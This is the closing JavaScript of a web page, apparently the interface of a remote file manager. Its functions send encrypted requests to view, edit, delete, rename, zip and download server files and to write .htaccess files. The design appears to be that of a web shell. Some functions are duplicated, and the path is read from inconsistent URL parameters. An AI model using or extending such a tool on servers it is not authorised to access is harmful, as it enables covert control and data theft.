				searchContentContainer.style.display = 'block';
				
				document.getElementById('contentInput').addEventListener('keypress', function(e) {
					if (e.key === 'Enter') {
						searchContent();
					}
				});
			} catch (error) {
				console.error('Error showing search content:', error);
			}
		}

		        		async function searchContent() {
			const content = document.getElementById('contentInput').value;
			const path = await getDecryptedPath();

			let data = {
				'op': 'searchcontent',
				'content': content
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				const outputDiv = document.getElementById('searchContentOutput');
				outputDiv.innerHTML = `<pre>${result.output}</pre>`;
				outputDiv.scrollTop = outputDiv.scrollHeight;
			} catch (error) {
				console.error('Error searching content:', error);
			}
		}

		async function showHtaccess() {
			hideAllInterfaces();
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = { 'op': 'htaccess' };
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let htaccessContainer = document.getElementById('htaccessContainer');
				if (!htaccessContainer) {
					htaccessContainer = document.createElement('div');
					htaccessContainer.id = 'htaccessContainer';
					htaccessContainer.className = 'dialog-container';
					document.body.appendChild(htaccessContainer);
				}
				
				htaccessContainer.innerHTML = html;
				htaccessContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing htaccess:', error);
			}
		}

		async function generateHtaccess() {
			const content = document.getElementById('htaccessContent').value;
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');
			
			let data = {
				'op': 'htaccess',
				'content': content
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				if (result.success) {
					alert('.htaccess file created successfully!');
					location.reload();
				} else {
					alert('Error: ' + (result.error || 'Failed to create .htaccess file'));
				}
			} catch (error) {
				console.error('Error generating htaccess:', error);
			}
		}

		// 新增文件操作功能
		async function saveFileEdit(filename) {
			const content = document.getElementById('editFileContent').value;
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = {
				'op': 'editfile',
				'filename': filename,
				'content': content
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				if (result.success) {
					alert('File edited successfully!');
					location.reload();
				} else {
					alert('Error: ' + (result.error || 'File editing failed'));
				}
			} catch (error) {
				console.error('Error saving file edit:', error);
			}
		}

		async function saveFileRename(filename) {
			const newName = document.getElementById('newFileName').value;
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = {
				'op': 'renamefile',
				'oldname': filename,
				'newname': newName
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				if (result.success) {
					alert('File renamed successfully!');
					location.reload();
				} else {
					alert('Error: ' + (result.error || 'File renaming failed'));
				}
			} catch (error) {
				console.error('Error saving file rename:', error);
			}
		}

		async function confirmDeleteFile(filename) {
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = {
				'op': 'deletefile',
				'filename': filename,
				'confirm': '1'
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				if (result.success) {
					alert('File deleted successfully!');
					location.reload();
				} else {
					alert('Error: ' + (result.error || 'File deletion failed'));
				}
			} catch (error) {
				console.error('Error confirming delete file:', error);
			}
		}

		async function createNewFile() {
			const filename = document.getElementById('newFileName').value;
			const content = document.getElementById('newFileContent').value;
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = {
				'op': 'createfile',
				'filename': filename,
				'content': content
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				if (result.success) {
					alert('File created successfully!');
					location.reload();
				} else {
					alert('Error: ' + (result.error || 'File creation failed'));
				}
			} catch (error) {
				console.error('Error creating new file:', error);
			}
		}

		async function createNewFolder() {
			const foldername = document.getElementById('newFolderName').value;
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = {
				'op': 'createfolder',
				'foldername': foldername
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				if (result.success) {
					alert('Folder created successfully!');
					location.reload();
				} else {
					alert('Error: ' + (result.error || 'Folder creation failed'));
				}
			} catch (error) {
				console.error('Error creating new folder:', error);
			}
		}

		// 顯示文件操作界面
		async function showViewFile(filename) {
			hideAllInterfaces();
			const path = await getDecryptedPath();

			let data = {
				'op': 'viewfile',
				'filename': filename
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let viewContainer = document.getElementById('viewFileContainer');
				if (!viewContainer) {
					viewContainer = document.createElement('div');
					viewContainer.id = 'viewFileContainer';
					viewContainer.className = 'dialog-container';
					document.body.appendChild(viewContainer);
				}
				
				viewContainer.innerHTML = html;
				viewContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing view file:', error);
				alert('Error: Unable to read file');
			}
		}

        async function showEditFile(filename) {
            hideAllInterfaces();
            const urlParams = new URLSearchParams(window.location.search);
            const path = urlParams.get('0');

            let data = {
                'op': 'editfile',
                'filename': filename
            };
            if (path) {
                data['path'] = path;
            }

            try {
                const response = await sendEncryptedPost(currentScript, data);
                const html = await response.text();
                
                let editContainer = document.getElementById('editFileContainer');
                if (!editContainer) {
                    editContainer = document.createElement('div');
                    editContainer.id = 'editFileContainer';
                    editContainer.className = 'dialog-container';
                    document.body.appendChild(editContainer);
                }
                
                editContainer.innerHTML = html;
                editContainer.style.display = 'block';
            } catch (error) {
                console.error('Error showing edit file:', error);
            }
        }

		async function showRenameFile(filename) {
			hideAllInterfaces();
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = {
				'op': 'renamefile',
				'filename': filename
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let renameContainer = document.getElementById('renameFileContainer');
				if (!renameContainer) {
					renameContainer = document.createElement('div');
					renameContainer.id = 'renameFileContainer';
					renameContainer.className = 'dialog-container';
					document.body.appendChild(renameContainer);
				}
				
				renameContainer.innerHTML = html;
				renameContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing rename file:', error);
			}
		}

		async function showDeleteFile(filename) {
			hideAllInterfaces();
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = {
				'op': 'deletefile',
				'filename': filename
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let deleteContainer = document.getElementById('deleteFileContainer');
				if (!deleteContainer) {
					deleteContainer = document.createElement('div');
					deleteContainer.id = 'deleteFileContainer';
					deleteContainer.className = 'dialog-container';
					document.body.appendChild(deleteContainer);
				}
				
				deleteContainer.innerHTML = html;
				deleteContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing delete file:', error);
			}
		}

		async function showCreateFile() {
			hideAllInterfaces();
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = { 'op': 'createfile' };
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let createContainer = document.getElementById('createFileContainer');
				if (!createContainer) {
					createContainer = document.createElement('div');
					createContainer.id = 'createFileContainer';
					createContainer.className = 'dialog-container';
					document.body.appendChild(createContainer);
				}
				
				createContainer.innerHTML = html;
				createContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing create file:', error);
			}
		}

		async function showCreateFolder() {
			hideAllInterfaces();
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = { 'op': 'createfolder' };
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let createContainer = document.getElementById('createFolderContainer');
				if (!createContainer) {
					createContainer = document.createElement('div');
					createContainer.id = 'createFolderContainer';
					createContainer.className = 'dialog-container';
					document.body.appendChild(createContainer);
				}
				
				createContainer.innerHTML = html;
				createContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing create folder:', error);
			}
		}

		async function showRenameFolder(foldername) {
			hideAllInterfaces();
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = {
				'op': 'renamefolder',
				'foldername': foldername
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let renameContainer = document.getElementById('renameFolderContainer');
				if (!renameContainer) {
					renameContainer = document.createElement('div');
					renameContainer.id = 'renameFolderContainer';
					renameContainer.className = 'dialog-container';
					document.body.appendChild(renameContainer);
				}
				
				renameContainer.innerHTML = html;
				renameContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing rename folder:', error);
			}
		}

		async function showDeleteFolder(foldername) {
			hideAllInterfaces();
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = {
				'op': 'deletefolder',
				'foldername': foldername
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let deleteContainer = document.getElementById('deleteFolderContainer');
				if (!deleteContainer) {
					deleteContainer = document.createElement('div');
					deleteContainer.id = 'deleteFolderContainer';
					deleteContainer.className = 'dialog-container';
					document.body.appendChild(deleteContainer);
				}
				
				deleteContainer.innerHTML = html;
				deleteContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing delete folder:', error);
			}
		}

		async function saveFolderRename(foldername) {
			const newName = document.getElementById('newFolderName').value;
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = {
				'op': 'renamefolder',
				'oldname': foldername,
				'newname': newName
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				if (result.success) {
					alert('Folder renamed successfully!');
					location.reload();
				} else {
					alert('Error: ' + (result.error || 'Folder renaming failed'));
				}
			} catch (error) {
				console.error('Error saving folder rename:', error);
			}
		}

		async function confirmDeleteFolder(foldername) {
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = {
				'op': 'deletefolder',
				'foldername': foldername,
				'confirm': '1'
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				if (result.success) {
					alert('Folder deleted successfully!');
					location.reload();
				} else {
					alert('Error: ' + (result.error || 'Folder deletion failed'));
				}
			} catch (error) {
				console.error('Error confirming delete folder:', error);
			}
		}

		async function showZipFolder(foldername) {
			hideAllInterfaces();
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('0');

			let data = {
				'op': 'zipfolder',
				'foldername': foldername
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let zipContainer = document.getElementById('zipFolderContainer');
				if (!zipContainer) {
					zipContainer = document.createElement('div');
					zipContainer.id = 'zipFolderContainer';
					zipContainer.className = 'dialog-container';
					document.body.appendChild(zipContainer);
				}
				
				zipContainer.innerHTML = html;
				zipContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing zip folder:', error);
			}
		}

		async function confirmZipFolder(foldername) {
			const zipFileName = document.getElementById('zipFileName').value;
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('path');

			let data = {
				'op': 'zipfolder',
				'foldername': foldername,
				'zipname': zipFileName,
				'confirm': '1'
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				if (result.success) {
					alert('Folder compressed successfully! ZIP file created: ' + result.zipfile);
					location.reload();
				} else {
					alert('Error: ' + (result.error || 'Folder compression failed'));
				}
			} catch (error) {
				console.error('Error confirming zip folder:', error);
			}
		}

		async function showZipFile(filename) {
			hideAllInterfaces();
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('path');

			let data = {
				'op': 'zipfile',
				'filename': filename
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let zipContainer = document.getElementById('zipFileContainer');
				if (!zipContainer) {
					zipContainer = document.createElement('div');
					zipContainer.id = 'zipFileContainer';
					zipContainer.className = 'dialog-container';
					document.body.appendChild(zipContainer);
				}
				
				zipContainer.innerHTML = html;
				zipContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing zip file:', error);
			}
		}

		async function confirmZipFile(filename) {
			const zipFileName = document.getElementById('zipFileName').value;
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('path');

			let data = {
				'op': 'zipfile',
				'filename': filename,
				'zipname': zipFileName,
				'confirm': '1'
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				if (result.success) {
					alert('File compressed successfully! ZIP file created: ' + result.zipfile);
					location.reload();
				} else {
					alert('Error: ' + (result.error || 'File compression failed'));
				}
			} catch (error) {
				console.error('Error confirming zip file:', error);
			}
		}

		async function downloadFile(filename) {
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('path');

			let data = {
				'op': 'downloadfile',
				'filename': filename
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				
				// 創建下載鏈接
				const blob = await response.blob();
				const url = window.URL.createObjectURL(blob);
				const a = document.createElement('a');
				a.href = url;
				a.download = filename;
				document.body.appendChild(a);
				a.click();
				window.URL.revokeObjectURL(url);
				document.body.removeChild(a);
			} catch (error) {
				console.error('Error downloading file:', error);
				alert('Download failed!');
			}
		}

		async function downloadFolder(foldername) {
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('path');

			let data = {
				'op': 'downloadfolder',
				'foldername': foldername
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				
				// 創建下載鏈接
				const blob = await response.blob();
				const url = window.URL.createObjectURL(blob);
				const a = document.createElement('a');
				a.href = url;
				a.download = foldername + '.zip';
				document.body.appendChild(a);
				a.click();
				window.URL.revokeObjectURL(url);
				document.body.removeChild(a);
			} catch (error) {
				console.error('Error downloading folder:', error);
				alert('Download failed!');
			}
		}

		async function showZipFolder(foldername) {
			hideAllInterfaces();
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('path');

			let data = {
				'op': 'zipfolder',
				'foldername': foldername
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const html = await response.text();
				
				let zipContainer = document.getElementById('zipFolderContainer');
				if (!zipContainer) {
					zipContainer = document.createElement('div');
					zipContainer.id = 'zipFolderContainer';
					zipContainer.className = 'dialog-container';
					document.body.appendChild(zipContainer);
				}
				
				zipContainer.innerHTML = html;
				zipContainer.style.display = 'block';
			} catch (error) {
				console.error('Error showing zip folder:', error);
			}
		}

		async function confirmZipFolder(foldername) {
			const zipFileName = document.getElementById('zipFileName').value;
			const urlParams = new URLSearchParams(window.location.search);
			const path = urlParams.get('path');

			let data = {
				'op': 'zipfolder',
				'foldername': foldername,
				'zipname': zipFileName,
				'confirm': '1'
			};
			if (path) {
				data['path'] = path;
			}

			try {
				const response = await sendEncryptedPost(currentScript, data);
				const result = await response.json();
				
				if (result.success) {
					alert('Folder compressed successfully! ZIP file created: ' + result.zipfile);
					location.reload();
				} else {
					alert('Error: ' + (result.error || 'Folder compression failed'));
				}
			} catch (error) {
				console.error('Error confirming zip folder:', error);
			}
		}
	</script>

</body>
</html>
